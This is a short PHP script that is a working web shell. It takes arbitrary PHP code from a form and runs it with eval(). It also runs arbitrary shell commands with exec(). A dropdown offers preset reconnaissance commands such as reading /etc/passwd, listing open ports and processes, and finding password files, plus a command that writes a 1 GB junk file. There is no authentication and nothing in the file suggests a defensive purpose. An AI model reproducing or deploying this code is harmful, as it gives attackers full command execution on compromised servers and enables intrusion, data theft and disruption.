<?php
function execphp(){ // PHP code execution function
	echo("<h4>Execute PHP Code</h4>");
	echo("<form method='POST'>");
	echo("<textarea name='phpexec' rows=5 cols=100>");
	if(!$_POST['phpexec'])
		echo("/*Don't include <? ?> tags*/\n");
	echo(htmlentities($_POST['phpexec']) . "</textarea>\n<br>\n");
	echo("<input type='submit' value='Execute'>");
	echo("</form>");
	if($_POST['phpexec']){
		echo("<textarea rows=10 cols=100>");
		eval(stripslashes($_POST['phpexec']));
		echo("</textarea>");
	}
}

function cmd(){ // Command execution function
	echo("<form name='CMD' method='POST'>");
	echo("<b>Command:</b><br>");
	echo("<input name='cmd' type='text' size='50'> ");
	echo("<select name='precmd'>");
	$precmd = array(''=>'','Read /etc/passwd'=>'cat /etc/passwd','Open ports'=>'netstat -an',
	'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id',
	'Create Junkfile (/tmp/z)'=>'dd if=/dev/zero of=/tmp/z bs=1M count=1024',
	'Find passwd files'=>'find / -type f -name passwd');
	$capt = array_flip($precmd);
	foreach($precmd as $c)
		echo("<option value='" . $c . "'>" . $capt[$c] . "\n");
	if($_POST['cmd'] != "")
		$x = $_POST['cmd'];
	elseif($_POST['precmd'] != "")
		$x = $_POST['precmd'];	
	else
		die();
	echo("Results: <br><textarea rows=20 cols=100>");
	$cmd = @exec($x, $result);
	foreach($result as $line)
		echo($line . "\n");
}

$act = $_POST['act'];

switch($act){
	case "phpinfo": phpinfo();break;
	case "cmd": cmd();break;
	case "phpexec": execphp();break;
	default: break;
}

?>